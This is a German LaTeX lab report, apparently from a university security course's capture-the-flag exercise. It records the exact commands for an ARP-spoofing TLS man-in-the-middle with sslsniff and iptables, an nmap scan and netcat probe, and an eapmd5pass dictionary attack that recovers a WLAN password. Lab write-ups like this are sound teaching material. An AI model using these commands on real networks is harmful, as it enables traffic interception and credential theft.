\documentclass[10pt,a4paper]{article}
\usepackage[utf8]{inputenc}
\usepackage{amsmath}
\usepackage{amsfonts}
\usepackage{amssymb}
\usepackage{graphicx}
\usepackage[ngerman]{babel}
\usepackage[left=2cm]{geometry}


\author{Christoph Robbert 6577945, Peter Stilow 6500440}
\title{Protokoll 6}
\begin{document}
\maketitle
 
\section*{Aufgabe 1}

\subsection*{a)}
Ein Mitschnitt mittels Wireshark auf den Workstations zeigte, dass sich auf den Workstations mit den IPs \texttt{192.26.175.11} und \texttt{192.26.175.13} ein Prozess mittels TLSv1.1 mit der IP \texttt{192.26.175.15} verbindet. Um diese Verbindung mitzuschneiden änderten wir auf der Workstation mittels 
\begin{verbatim}
arp -s 192.26.175.15 52:54:00:2c:4f:ec
\end{verbatim}
Den ARP Eintrag für die IP \texttt{192.26.175.15} auf die MAC Adresse der Kali VM auf derselben Workstation.
In der Kali VM starten wir das Tool sslsniff.
Um dieses Tool verwenden zu können, mussten wir in der Kali VM mittels
\begin{verbatim}
echo 1 > /proc/sys/net/ipv4/ip_forward
\end{verbatim} 
Das IP forwarding einschalten. Außerdem haben wir wie in der \texttt{man-page} von \texttt{sslsniff} beschrieben die Regel für IP Tables umgeschrieben, sodass alle Zugriffe auf den Port 443 auf den Port 4433 umgeleitet werden.
\begin{verbatim}
iptables -t nat -A PREROUTING -p tcp --destination-port 443  -j REDIRECT --to-ports 4433
\end{verbatim}
Danach starteten wir sslsniff mit den folgenden Parametern:
\begin{verbatim}
sslsniff  -a  -c  /usr/share/sslsniff/certs/wildcard  -s 4433 -w /tmp/sslsniff.log
\end{verbatim}
Nach kurzer Zeit fanden wir die folgenden Zeilen in der Logdatei \texttt{sslsniff.log}:
\begin{verbatim}
Hallo bernd!
Hier ist deine Flagge: 1107174691af9ff3681d2b5bdb5740b1589bae53

Neue Zugangsdaten
Benutzer: bernd
Passwort: SicheresPasswort
\end{verbatim}
Die Flagge lautet also \texttt{1107174691af9ff3681d2b5bdb5740b1589bae53}


\subsection*{b)}
Im Netzwerk fällt außerdem eine Active Discovery Offer für ein PPPoED Netzwerk auf.
\begin{verbatim}
CadmusCo_48:ae:eb	RealtekU_12:23:11	PPPoED	60	Active Discovery Offer (PADO) AC-Name='BerndCom'
\end{verbatim}
Mit den Zugangsdaten aus der Aufgabe a) kann man eine PPPoE Verbindung aufbauen. 
Es zeigte sich per \texttt{nmap}, dass in dem Subnetz \texttt{192.168.42.0/26} nur noch der Rechner \texttt{192.168.42.1} online ist. Ein vollständiger Portscan mittels
\begin{verbatim}
nmap -p - 192.168.42.1
\end{verbatim} 
zeigte folgende offenen Port:
\begin{verbatim}
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  https
54321/tcp open  unkown 
\end{verbatim}
Verband man sich mittels \texttt{nc 192.168.42.1 54321} auf den auffälligen Port \texttt{54321} erhielt man nachdem man eine nicht leere Eingabe getätigt hat die Flagge \texttt{9a855525712ce3cd42de2e600cecfb8b5c65b6fc}.

\section*{Aufgabe 2}
Da sich Bernd für EAPMD5 entschieden hat in einem WLAN, kann man den Benutzernamen und das Passwort mittels eines Wörterbuchangriff aus dem mitgeschnittenen Handshake errechnen. EAPMD5 ist nur für abhörsichere Verbindungen ausgelegt, was in einem WLAN  nicht der Fall ist. Daher hat Bernd sich falsch entschieden. 

Der Benutzername ist in den abgefangenen Paketen im Klartext enthalten. Das Passwort aber nicht. Jedoch wird eine MD5 Challenge (\texttt{ba:63:76:d0:738e:a7:2b:ef:e6:6b:11:c1:f0:2e:33}) im zweiten Paket geschickt. Der Client antwortet mit der Antwort auf diese Challenge (\texttt{a3:dc:28:81:e3:be:88:1c:72:2f:52:6d:1c:ac:db:8d}). Aus diesen beiden Hashes und der EAPID(die auch im Klartext mitgeschickt wird), dem Benutzer und eines Wörterbuch kann man mittels des folgenden Befehls das Passwort berechnen lassen.
\begin{verbatim}
eapmd5pass  -U bernd -E 7 -C ba:63:76:d0:738e:a7:2b:ef:e6:6b:11:c1:f0:2e:33 
-R a3:dc:28:81:e3:be:88:1c:72:2f:52:6d:1c:ac:db:8d -w rockyou.txt
\end{verbatim}
Die Ausgabe lautet:
\begin{verbatim}
eapmd5pass - Dictionary attack against EAP-MD5
User password is "existance".
513775 passwords in 0.16 seconds: 3217246.75 passwords/second.
\end{verbatim}

Damit ist das Passwort von Bernd: \texttt{existance}


\end{document}
